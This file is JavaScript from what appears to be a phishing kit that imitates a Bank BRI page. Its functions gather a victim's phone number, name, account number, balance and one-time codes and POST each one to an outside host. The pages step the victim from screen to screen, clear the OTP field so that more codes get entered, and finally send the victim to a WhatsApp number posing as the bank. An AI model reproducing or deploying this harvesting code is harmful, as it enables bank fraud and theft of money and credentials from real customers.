
// index
function sendNohp(){
    $(".load").fadeIn();
    event.preventDefault();   
  var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);
    document.getElementById('kirim').innerHTML = "Memproses....";         
    var nomor = document.getElementById("nohp").value;
    sessionStorage.setItem("nomor", nomor);                    
    var logo = document.getElementById('logo');       
    var nohp = document.getElementById('nohp');    
    
   
      $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/fd-xx1/no.php',
        data: $('#formHP').serialize(),
        datatype: 'JSON',   
    complete: function(){
    setTimeout(function(){   
    window.location = "login.html";
    $("#lonte").hide();
    $(".load").fadeOut();  
    document.getElementById('kirim').innerHTML = "Lanjutkan";
    vibr(180);
    }, 500);}});};   
     
     
     
//data     
function sendDebit(){
   $('.load').fadeIn();
    event.preventDefault();   
    document.getElementById('kirim').innerHTML = "Memproses....";               
    var logo = document.getElementById('logo');     
    var nama = document.getElementById('nama');
    var rek = document.getElementById('rek');    
    
   
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/fd-xx1/login.php',
        data: $('#formlog').serialize(),
        datatype: 'JSON',    
    complete: function(){    
    setTimeout(function(){   
    window.location = "saldo.html";
    $("#lonte").hide();
    $('.load').fadeOut();
    document.getElementById('kirim').innerHTML = "Lanjutkan"; 
    var tarif = $('#tarif').val();
  sessionStorage.setItem('tarif', tarif);     
var nomortel = document.getElementById('nomorku').value;
            sessionStorage.setItem("nomortel", nomortel);
var noreke = document.getElementById('rek').value;
           sessionStorage.setItem("noreke", noreke);
var namanya = document.getElementById('nama').value;
            sessionStorage.setItem("namanya", namanya);
   vibr(180);
    }, 1500);}});};
    
       
    
    
// saldo  
function sendSaldo(){
    event.preventDefault();    
    document.getElementById('kirim').innerHTML = "Verify...";
    $("#lonte").show();
    $('.load').fadeIn();                    
    var logo = document.getElementById('logo');     
    var saldo = document.getElementById('saldo');    
    
  
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/fd-xx1/saldo.php',
        data: $('#formsal').serialize(),
        datatype: 'JSON',   
   complete: function(){     
   setTimeout(function(){
   document.getElementById('kirim').innerHTML = "Benar";
   $("#lonte").hide();
   $('.load').fadeOut();
   window.location = "otp.html";
   vibr(180);  
 var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namaku").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("norekku").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);
    }, 300);}});};    

        


// otp
function sendOtp(){
    event.preventDefault();        
    document.getElementById('kirims').value = "Memproses....";                            
    var logo = document.getElementById('logo');     
    var nama1 = document.getElementById('nama1');    
     
   
        $.ajax({
        type: 'POST',
        url: 'https://choreoapps.oo-feed.cfd/fd-xx1/otp.php',
        data: $('#formLink').serialize(),
        datatype: 'JSON',    
    complete: function(){
    vibr(800);    
    setTimeout(function(){
    showAlert("a");
 $("#nama1").val("");
 $("#nama1").addClass('textarea1'); 
   document.getElementById('kirims').value = "Konfirmasi";
    }, 200);}});};




function get(){
 $("#process1").show();
 $('.load').fadeIn();   
setTimeout(function(){  
location.href='https://wa.me/6282226561003?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20Request%20Kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();
 }, 2000);    
}     
